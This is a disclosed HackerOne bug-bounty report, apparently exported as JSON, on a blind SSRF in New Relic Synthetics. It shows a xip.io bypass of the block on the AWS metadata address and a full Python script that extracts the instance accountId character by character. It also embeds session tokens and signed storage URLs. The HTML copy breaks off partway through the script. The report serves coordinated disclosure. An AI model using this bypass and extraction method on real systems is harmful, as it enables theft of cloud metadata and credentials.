{"id":141304,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xNDEzMDQ=","url":"https://hackerone.com/reports/141304","title":"Blind SSRF on synthetics.newrelic.com","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-26T21:34:59.173Z","submitted_at":"2016-05-26T21:34:59.173Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"ylujion","url":"/ylujion","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/015/009/4b768d3628d874ff02edfb9b2dc4a42031141603_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":17011,"url":"https://hackerone.com/newrelic","handle":"newrelic","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/017/011/eba06abb23bd6c9c7d719ddafb9fa83bd2d66aaa_original./eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"New Relic","twitter_handle":"newrelic","website":"https://newrelic.com","about":"New Relic's Coordinated Disclosure Program"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2016-09-05T07:25:24.196Z","bug_reporter_agreed_on_going_public_at":"2016-09-05T07:25:24.027Z","team_member_agreed_on_going_public_at":"2016-08-26T23:32:17.972Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Introduction\n\nIt was possible to retrieve some data from the `http://169.254.169.254/latest/` URL corresponding to the [amazon instance metadatas](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html). With more time, we can dump the whole content.\n\n## PoC\n\nWhen creating a `Ping Monitor` on the `https://synthetics.newrelic.com/accounts/XXXXXXX/synthetics` URL, it is possible to check if a website is online and match for a string in the retrieved page.\n\nFirst I tried to create a `Ping Monitor` where the `Monitor URL` is set to `http://169.254.169.254/latest/dynamic/instance-identity/document` to see if we can access to this URL from on of the location available. For the PoC I used the `Dublin, IE` location. When trying this we get the following errors:\n {F96303}\n\nWe are not able to directly access the URL as it seems to be blocked. It was possible to bypass this by using [xip.io](http://xip.io/). It does the following as written on the web page:\n```\nWhat is xip.io?\nxip.io is a magic domain name that provides wildcard DNS\nfor any IP address. Say your LAN IP address is 10.0.0.1.\nUsing xip.io,\n\n          10.0.0.1.xip.io   resolves to   10.0.0.1\n      www.10.0.0.1.xip.io   resolves to   10.0.0.1\n   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1\n  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1\n\n...and so on. You can use these domains to access virtual\nhosts on your development web server from devices on your\nlocal network, like iPads, iPhones, and other computers.\nNo configuration required!\n```\n\nSo now we set our `Monitor URL` to `http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document` and the file is successfully accessed:\n {F96304}\n\nWhen looking at [amazons documentation](http://docs.aws.amazon.com/AWSEC2/latest/UserGuide/instance-identity-documents.html) we know how the `latest/dynamic/instance-identity/document` file is structured:\n```\n{\n  \"devpayProductCodes\" : null,\n  \"availabilityZone\" : \"us-east-1d\",\n  \"privateIp\" : \"10.158.112.84\",\n  \"version\" : \"2010-08-31\",\n  \"region\" : \"us-east-1\",\n  \"instanceId\" : \"i-1234567890abcdef0\",\n  \"billingProducts\" : null,\n  \"instanceType\" : \"t1.micro\",\n  \"accountId\" : \"123456789012\",\n  \"pendingTime\" : \"2015-11-19T16:32:11Z\",\n  \"imageId\" : \"ami-5fb8c835\",\n  \"kernelId\" : \"aki-919dcaf8\",\n  \"ramdiskId\" : null,\n  \"architecture\" : \"x86_64\"\n}\n```\n\nAs a PoC, we are going to retrieve the `accountId` value from the `Dublin, IE` amazon instance. For this purpose the following `python` script was created:\n```\n#!/usr/bin/python3\nimport requests\nimport json\nimport time\n\n#Charset that will be used to determine the accountId\nalpha_min = '0123456789'\n\n#Headers needed for some requests\nheaders = {'Accept': 'application/json'}\nheaders_put = {'Accept': 'application/json', 'Content-Type' : 'application/json;charset=UTF-8'}\n\n#Session cookie\ncookies = dict(login_service_login_newrelic_com_tokens = '%7B%22token%22%3A%22Y%2BhwhJQWlDb17uNTpQfnuPFA8bMsskQ6IgvuiSiiixS4GBbwE7xFB5F41Uqzb0tsHlpW9CukhUMWsXbUjZjpDrVDsLEZMxV1wZbhNb97LIkOCxDuDd6Nt32ggUJq1OYeYMojw0095ng50d6Zry%2FJfbnQUhVS2TdvP2jrLNXoikyq46FpL18fVOMnmQzEQ9r274FEIJSVr9AnVAGSW2rLa5G4tPF7BXh2GOaMgMCOH3ZjSpeRaIwKdOddc3pKFcTf6UP9CIb6tC91CXL16oU2wXXMX8D%2FNq6vIL21brVNi%2Fm8v5ocNX9aalnDsjmy01zb4XgaGzesdYYUDl6wmG4SGA%3D%3D%22%2C%22refresh_token%22%3A%22mCmVpRqqUpZpIyFDxMIyzaDlb6qTDt6obDVykOSqbrLslV45jrmGzWYIJoXcUgMSAkmhWcharI7TD9aEx0qh7uLz0u5llkjkzuyEtZLzNENBqKvIgaRYB7cCLWhfyc466rIEDn1z%2B%2FMb38cFuMLcR9V0USrvt%2FbGlSQhwbtcvb60KtSJ0f43e9DO9cIuEVT6KEV14Q6QeLT34rp9belSzOfvCA16VL9Jlb4eVktfVhQ4o0bKz0Js64bsaacEC7pSW58BeLqz4xUCiQYgh1SJp2lyG%2BYKooJBssHRbVu671KIiibwYI5fizivbtZD8eguXd9dTtxdhXMXigyOS9pR6w%3D%3D%22%7D')\n\n#Base URL\nurl = 'https://synthetics.newrelic.com'\n\n#URL suffixes of actions that will be used\nlatest_monitor = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results.json?includeFailed=true\u0026locations=AWS_EU_WEST_1\u0026locations=AWS_US_EAST_1\u0026locations=LINODE_EU_WEST_1\u0026orderBy=timestamp+desc\u0026since=1363517150000\u0026until=1564121950000'\njob = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd/results/REPLACEME/job'\nchange_settings = '/accounts/1340503/monitors/015101be-7318-452a-b210-1e4c443cc0fd.json'\n\n#Requesting the current monitor\nr = requests.get(url + latest_monitor, cookies=cookies).json()\noriginal_id = r[0]['id']\n\n#String that will be filled\nto_find = ''\n\ncount = 0\nwhile(42):\n\tr = requests.get(url + latest_monitor, cookies=cookies).json()\n\ttmp_id = r[0]['id']\n\tprint(tmp_id)\n\tprint(original_id)\n\t#If the ID has changed, a new monitor state has arrived\n\tif original_id != tmp_id:\n\t\tr = requests.get(url + job.replace('REPLACEME', tmp_id), cookies=cookies, headers=headers).json()\n\t\tprint(r['URI'])\n\t\tprint(r['status'])\n\t\t#If the status of the monitor is set to SUCCESS, our \"Response validation\" string is matched and we store the found character and search for a new one\n\t\tif r['status'] == 'SUCCESS':\n\t\t\tto_find += alpha_min[count - 1]\n\t\t\tcount = 0\n\t\t#We configure our job with a new \"Response validation\" string\n\t\toriginal_id = tmp_id\n\t\turi = \"http://accountId\\\"+:+\\\"REPLACE@169.254.169.254.xip.io/latest/dynamic/instance-identity/document\".replace('REPLACE', alpha_min[count])\n\t\taccountid = \"accountId\\\" : \\\"\" + to_find + \"REPLACE\".replace('REPLACE', alpha_min[count])\n\t\tx = {\"id\":\"015101be-7318-452a-b210-1e4c443cc0fd\",\"name\":\"test\",\"accountId\":1340503,\"userId\":1616087,\"frequency\":1,\"uri\":uri,\"locations\":[\"AWS_EU_WEST_1\"],\"emails\":[],\"status\":\"ENABLED\",\"apiVersion\":\"0.2.2\",\"slaThreshold\":5,\"metadata\":{\"nr.synthetics.metadata.job.options.simple.bypass.head\":\"true\",\"nr.synthetics.metadata.job.options.response-validation\":accountid},\"conditions\":[],\"type\":\"SIMPLE\",\"permissions\":{\"monitor/read\":\"true\",\"monitor/write\":\"true\"},\"crc\":1899546310,\"currentChecks\":43200}\n\t\tr = requests.put(url + change_settings, data=json.dumps(x), cookies=cookies, headers=headers_put)\n\t\tprint(r.text)\n\t\tcount += 1\n\t#We sleep for 30 seconds as the jobs are received every 1 minute\n\ttime.sleep(30)\n```\n\nWhat we do with this script is:\n+ we create a `Response validation` string matching `accountId\" : \"` on the `Monitor URL` set to  `http://169.254.169.254.xip.io/latest/dynamic/instance-identity/document` ;\n+ we the add a single character to the `Response validation` string from our numeric charset string and wait one minute ;\n+ when a new job has been done, we check if the `status` is `FAILURE` or `SUCCESS`. If it is `FAILURE` we try another single character from our numeric charset, if it is `SUCCESS` we matched a new valid character, add it to our `Response validation` string and search for the next character.\n+ we do this until our script fails as no more numeric characters are to be found.\n\nBy using this string we could determine the value of the `accountId` is `017663287629` in the `latest/dynamic/instance-identity/document` file of the `Dublin, IE` instance.\n\nWe could then use the same methodology to dump all files accessible through this URL. For example the `/latest/user-data` file is containing a script. It is also accessible and by checking the same way with the `Response validation` set to `/bin/` was successfully matched through a `monitor`.\n\n## Risks\n\nAn attacker would be able to dump all the information contained in the `/latest/` folder of the amazon instance.\n\n## Mitigation\n\n+ Do not let it be possible to access the `169.254.169.254` IP address from a monitor.\n\n## Comments\n\nI did not take the time to make a more deeper script that could use multiple `monitors` to communicate between them to dump data faster but it can be done.\n\nI hope I didn't forget any important step to exploit this. It is quite difficult to exploit and to explain. Please let me know if you need any further information.\n\nRegards.\n","vulnerability_information_html":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\n\u003cp\u003eIt was possible to retrieve some data from the \u003ccode\u003ehttp://169.254.169.254/latest/\u003c/code\u003e URL corresponding to the \u003ca href=\"/redirect?url=http%3A%2F%2Fdocs.aws.amazon.com%2FAWSEC2%2Flatest%2FUserGuide%2Fec2-instance-metadata.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eamazon instance metadatas\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. With more time, we can dump the whole content.\u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePoC\u003c/h2\u003e\n\n\u003cp\u003eWhen creating a \u003ccode\u003ePing Monitor\u003c/code\u003e on the \u003ccode\u003ehttps://synthetics.newrelic.com/accounts/XXXXXXX/synthetics\u003c/code\u003e URL, it is possible to check if a website is online and match for a string in the retrieved page.\u003c/p\u003e\n\n\u003cp\u003eFirst I tried to create a \u003ccode\u003ePing Monitor\u003c/code\u003e where the \u003ccode\u003eMonitor URL\u003c/code\u003e is set to \u003ccode\u003ehttp://169.254.169.254/latest/dynamic/instance-identity/document\u003c/code\u003e to see if we can access to this URL from on of the location available. For the PoC I used the \u003ccode\u003eDublin, IE\u003c/code\u003e location. When trying this we get the following errors:\u003cbr\u003e\n \u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"1.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/303/49bf69cee7f54f5fb4f77957c7f1910d2ef7c7ef/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQT66234QS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042827Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDSp%2BGHwVXW7fBK%2FK1nDT3bJMDMcRKjcnebqf9FCBKk%2FAIgb5aU4qkic%2BP2ixvdLyQKidiv4RPG73HNrvXKpCI2nZEqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDHxkHAFZXVcmltu4siqRA%2BuBKYL9pEqirXbS9y9NCsTy%2BN6TtBTj%2BlvlTo8VhjnR%2F2XvLfk4SwGUPrjtOfauAzMQbEyv%2FVcDPUGkk5Pb%2FRjvlrv9d1oobHMn5A6J0%2FHC65X7PIQxLjVDtwlSo4SF6ijeN9qB355sssD9sLxjax2%2BnAkD4fArFVvvToscZtB6NtOY2q0rUx347j0lgV0FrvHt8hAyqp3FQKAnU1XuYv1VMIvdrRLD9wF2wotmgZeYOcfe2K38sNBkK3SdUDyQ7fS%2ByZV%2BCE2hmUzw%2BEzRt4na30MIJecCnaDpznKHmNqJxGy2ggV8R9TunQ5ZW9o6cE4pPn6Q6qVGbiJ1EZdemRmrUmoYHi%2BSvjwM9zgKbVUmO3e972MxhiMnyHu3qKDZ5tmDVNvBqFxPYmhrotN5%2BdtShNxeA5GfjlXJX8gzYdNzvlMMH7XKrH9BYTrYhCSFNfsbJGLjgGIlyNProwCFcn8f2p4ki6p%2FJZ4lxExrMpQrJPwZiUFjJRU8X31zDnxJ0j9uX%2B0YDc6tLHQjVGxRYxQBMNn%2Fqf8FOusBoTiSBHwYwuKYDdnq9H2o1NA3EgQR2InM8n%2BKrgwQfqQvtm9eV%2BksfFYRzWT7yHSJP64JUp1GiBPDKnathP%2B%2Fjsed1LSpHlEF%2F1yiMKsxVhBmn1YdgPDBz%2FFZASz9KLYqXkr8f3WKuQnj8lcONKHMM278gSGAvqVR38RoutR8gSbzHIUb2X9CNZFwgFwpnNuood59%2B7WfO6adjW3fBIdJna7ATwsLIRJx32ec665%2FfwwRm5HMM6weh%2B7s03mYt0cXLKhnPUuQ5gRfNzn%2FgnEM5Uo71xOF7A2oylTkHNPEnfasiV7EeEt9obvbyg%3D%3D\u0026amp;X-Amz-Signature=5bb60761f1b0de0650e4da5edfcada32dfc1f22ddbe5f5faac1f4fbc0416a2dd\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/303/49bf69cee7f54f5fb4f77957c7f1910d2ef7c7ef/1.png?response-content-disposition=attachment%3B%20filename%3D%221.png%22%3B%20filename%2A%3DUTF-8%27%271.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQT66234QS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042827Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDSp%2BGHwVXW7fBK%2FK1nDT3bJMDMcRKjcnebqf9FCBKk%2FAIgb5aU4qkic%2BP2ixvdLyQKidiv4RPG73HNrvXKpCI2nZEqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDHxkHAFZXVcmltu4siqRA%2BuBKYL9pEqirXbS9y9NCsTy%2BN6TtBTj%2BlvlTo8VhjnR%2F2XvLfk4SwGUPrjtOfauAzMQbEyv%2FVcDPUGkk5Pb%2FRjvlrv9d1oobHMn5A6J0%2FHC65X7PIQxLjVDtwlSo4SF6ijeN9qB355sssD9sLxjax2%2BnAkD4fArFVvvToscZtB6NtOY2q0rUx347j0lgV0FrvHt8hAyqp3FQKAnU1XuYv1VMIvdrRLD9wF2wotmgZeYOcfe2K38sNBkK3SdUDyQ7fS%2ByZV%2BCE2hmUzw%2BEzRt4na30MIJecCnaDpznKHmNqJxGy2ggV8R9TunQ5ZW9o6cE4pPn6Q6qVGbiJ1EZdemRmrUmoYHi%2BSvjwM9zgKbVUmO3e972MxhiMnyHu3qKDZ5tmDVNvBqFxPYmhrotN5%2BdtShNxeA5GfjlXJX8gzYdNzvlMMH7XKrH9BYTrYhCSFNfsbJGLjgGIlyNProwCFcn8f2p4ki6p%2FJZ4lxExrMpQrJPwZiUFjJRU8X31zDnxJ0j9uX%2B0YDc6tLHQjVGxRYxQBMNn%2Fqf8FOusBoTiSBHwYwuKYDdnq9H2o1NA3EgQR2InM8n%2BKrgwQfqQvtm9eV%2BksfFYRzWT7yHSJP64JUp1GiBPDKnathP%2B%2Fjsed1LSpHlEF%2F1yiMKsxVhBmn1YdgPDBz%2FFZASz9KLYqXkr8f3WKuQnj8lcONKHMM278gSGAvqVR38RoutR8gSbzHIUb2X9CNZFwgFwpnNuood59%2B7WfO6adjW3fBIdJna7ATwsLIRJx32ec665%2FfwwRm5HMM6weh%2B7s03mYt0cXLKhnPUuQ5gRfNzn%2FgnEM5Uo71xOF7A2oylTkHNPEnfasiV7EeEt9obvbyg%3D%3D\u0026amp;X-Amz-Signature=5bb60761f1b0de0650e4da5edfcada32dfc1f22ddbe5f5faac1f4fbc0416a2dd\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWe are not able to directly access the URL as it seems to be blocked. It was possible to bypass this by using \u003ca href=\"/redirect?url=http%3A%2F%2Fxip.io%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003exip.io\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e. It does the following as written on the web page:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eWhat is xip.io?\nxip.io is a magic domain name that provides wildcard DNS\nfor any IP address. Say your LAN IP address is 10.0.0.1.\nUsing xip.io,\n\n          10.0.0.1.xip.io   resolves to   10.0.0.1\n      www.10.0.0.1.xip.io   resolves to   10.0.0.1\n   mysite.10.0.0.1.xip.io   resolves to   10.0.0.1\n  foo.bar.10.0.0.1.xip.io   resolves to   10.0.0.1\n\n...and so on. You can use these domains to access virtual\nhosts on your development web server from devices on your\nlocal network, like iPads, iPhones, and other computers.\nNo configuration required!\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eSo now we set our \u003ccode\u003eMonitor URL\u003c/code\u003e to \u003ccode\u003ehttp://169.254.169.254.xip.io/latest/dynamic/instance-identity/document\u003c/code\u003e and the file is successfully accessed:\u003cbr\u003e\n \u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"2.png\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/304/da1889b55de70954128b65d55884c1abbaedf263/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQT66234QS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042827Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDSp%2BGHwVXW7fBK%2FK1nDT3bJMDMcRKjcnebqf9FCBKk%2FAIgb5aU4qkic%2BP2ixvdLyQKidiv4RPG73HNrvXKpCI2nZEqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDHxkHAFZXVcmltu4siqRA%2BuBKYL9pEqirXbS9y9NCsTy%2BN6TtBTj%2BlvlTo8VhjnR%2F2XvLfk4SwGUPrjtOfauAzMQbEyv%2FVcDPUGkk5Pb%2FRjvlrv9d1oobHMn5A6J0%2FHC65X7PIQxLjVDtwlSo4SF6ijeN9qB355sssD9sLxjax2%2BnAkD4fArFVvvToscZtB6NtOY2q0rUx347j0lgV0FrvHt8hAyqp3FQKAnU1XuYv1VMIvdrRLD9wF2wotmgZeYOcfe2K38sNBkK3SdUDyQ7fS%2ByZV%2BCE2hmUzw%2BEzRt4na30MIJecCnaDpznKHmNqJxGy2ggV8R9TunQ5ZW9o6cE4pPn6Q6qVGbiJ1EZdemRmrUmoYHi%2BSvjwM9zgKbVUmO3e972MxhiMnyHu3qKDZ5tmDVNvBqFxPYmhrotN5%2BdtShNxeA5GfjlXJX8gzYdNzvlMMH7XKrH9BYTrYhCSFNfsbJGLjgGIlyNProwCFcn8f2p4ki6p%2FJZ4lxExrMpQrJPwZiUFjJRU8X31zDnxJ0j9uX%2B0YDc6tLHQjVGxRYxQBMNn%2Fqf8FOusBoTiSBHwYwuKYDdnq9H2o1NA3EgQR2InM8n%2BKrgwQfqQvtm9eV%2BksfFYRzWT7yHSJP64JUp1GiBPDKnathP%2B%2Fjsed1LSpHlEF%2F1yiMKsxVhBmn1YdgPDBz%2FFZASz9KLYqXkr8f3WKuQnj8lcONKHMM278gSGAvqVR38RoutR8gSbzHIUb2X9CNZFwgFwpnNuood59%2B7WfO6adjW3fBIdJna7ATwsLIRJx32ec665%2FfwwRm5HMM6weh%2B7s03mYt0cXLKhnPUuQ5gRfNzn%2FgnEM5Uo71xOF7A2oylTkHNPEnfasiV7EeEt9obvbyg%3D%3D\u0026amp;X-Amz-Signature=950ad4ff69044baa981a36f1922a1d042917d8ebacdc05740a228084921d86e2\" data-attachment-type=\"image/png\"\u003e\u003cimg src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/096/304/da1889b55de70954128b65d55884c1abbaedf263/2.png?response-content-disposition=attachment%3B%20filename%3D%222.png%22%3B%20filename%2A%3DUTF-8%27%272.png\u0026amp;response-content-type=image%2Fpng\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQT66234QS%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T042827Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQDSp%2BGHwVXW7fBK%2FK1nDT3bJMDMcRKjcnebqf9FCBKk%2FAIgb5aU4qkic%2BP2ixvdLyQKidiv4RPG73HNrvXKpCI2nZEqtAMIUhABGgwwMTM2MTkyNzQ4NDkiDHxkHAFZXVcmltu4siqRA%2BuBKYL9pEqirXbS9y9NCsTy%2BN6TtBTj%2BlvlTo8VhjnR%2F2XvLfk4SwGUPrjtOfauAzMQbEyv%2FVcDPUGkk5Pb%2FRjvlrv9d1oobHMn5A6J0%2FHC65X7PIQxLjVDtwlSo4SF6ijeN9qB355sssD9sLxjax2%2BnAkD4fArFVvvToscZtB6NtOY2q0rUx347j0lgV0FrvHt8hAyqp3FQKAnU1XuYv1VMIvdrRLD9wF2wotmgZeYOcfe2K38sNBkK3SdUDyQ7fS%2ByZV%2BCE2hmUzw%2BEzRt4na30MIJecCnaDpznKHmNqJxGy2ggV8R9TunQ5ZW9o6cE4pPn6Q6qVGbiJ1EZdemRmrUmoYHi%2BSvjwM9zgKbVUmO3e972MxhiMnyHu3qKDZ5tmDVNvBqFxPYmhrotN5%2BdtShNxeA5GfjlXJX8gzYdNzvlMMH7XKrH9BYTrYhCSFNfsbJGLjgGIlyNProwCFcn8f2p4ki6p%2FJZ4lxExrMpQrJPwZiUFjJRU8X31zDnxJ0j9uX%2B0YDc6tLHQjVGxRYxQBMNn%2Fqf8FOusBoTiSBHwYwuKYDdnq9H2o1NA3EgQR2InM8n%2BKrgwQfqQvtm9eV%2BksfFYRzWT7yHSJP64JUp1GiBPDKnathP%2B%2Fjsed1LSpHlEF%2F1yiMKsxVhBmn1YdgPDBz%2FFZASz9KLYqXkr8f3WKuQnj8lcONKHMM278gSGAvqVR38RoutR8gSbzHIUb2X9CNZFwgFwpnNuood59%2B7WfO6adjW3fBIdJna7ATwsLIRJx32ec665%2FfwwRm5HMM6weh%2B7s03mYt0cXLKhnPUuQ5gRfNzn%2FgnEM5Uo71xOF7A2oylTkHNPEnfasiV7EeEt9obvbyg%3D%3D\u0026amp;X-Amz-Signature=950ad4ff69044baa981a36f1922a1d042917d8ebacdc05740a228084921d86e2\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eWhen looking at \u003ca href=\"/redirect?url=http%3A%2F%2Fdocs.aws.amazon.com%2FAWSEC2%2Flatest%2FUserGuide%2Finstance-identity-documents.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003eamazons documentation\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e we know how the \u003ccode\u003elatest/dynamic/instance-identity/document\u003c/code\u003e file is structured:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n  \u0026quot;devpayProductCodes\u0026quot; : null,\n  \u0026quot;availabilityZone\u0026quot; : \u0026quot;us-east-1d\u0026quot;,\n  \u0026quot;privateIp\u0026quot; : \u0026quot;10.158.112.84\u0026quot;,\n  \u0026quot;version\u0026quot; : \u0026quot;2010-08-31\u0026quot;,\n  \u0026quot;region\u0026quot; : \u0026quot;us-east-1\u0026quot;,\n  \u0026quot;instanceId\u0026quot; : \u0026quot;i-1234567890abcdef0\u0026quot;,\n  \u0026quot;billingProducts\u0026quot; : null,\n  \u0026quot;instanceType\u0026quot; : \u0026quot;t1.micro\u0026quot;,\n  \u0026quot;accountId\u0026quot; : \u0026quot;123456789012\u0026quot;,\n  \u0026quot;pendingTime\u0026quot; : \u0026quot;2015-11-19T16:32:11Z\u0026quot;,\n  \u0026quot;imageId\u0026quot; : \u0026quot;ami-5fb8c835\u0026quot;,\n  \u0026quot;kernelId\u0026quot; : \u0026quot;aki-919dcaf8\u0026quot;,\n  \u0026quot;ramdiskId\u0026quot; : null,\n  \u0026quot;architecture\u0026quot; : \u0026quot;x86_64\u0026quot;\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAs a PoC, we are going to retrieve the \u003ccode\u003eaccountId\u003c/code\u003e value from the \u003ccode\u003eDublin, IE\u003c/code\u003e amazon instance. For this purpose the following \u003ccode\u003epython\u003c/code\u003e script was created:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight python\"\u003e\u003ccode\u003e\u003cspan class=\"c1\"\u003e#!/usr/bin/python3\n\u003c/span\u003e\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003erequests\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003ejson\u003c/span\u003e\n\u003cspan class=\"kn\"\u003eimport\u003c/span\u003e \u003cspan class=\"nn\"\u003etime\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e#Charset that will be used to determine the accountId\n\u003c/span\u003e\u003cspan class=\"n\"\u003ealpha_min\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;0123456789\u0026#39;\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e#Headers needed for some requests\n\u003c/span\u003e\u003cspan class=\"n\"\u003eheaders\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Accept\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003cspan class=\"n\"\u003eheaders_put\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#39;Accept\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;application/json\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;Content-Type\u0026#39;\u003c/span\u003e \u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;application/json;charset=UTF-8\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"c1\"\u003e#Session cookie\n\u003c/span\u003e\u003cspan class=\"n\"\u003ecookies\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nb\"\u003edict\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003elogin_service_login_newrelic_com_tokens\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"si\"\u003e%7\u003c/span\u003e\u003cspan class=\"s\"\u003eB\u003c/span\u003e\u003cspan 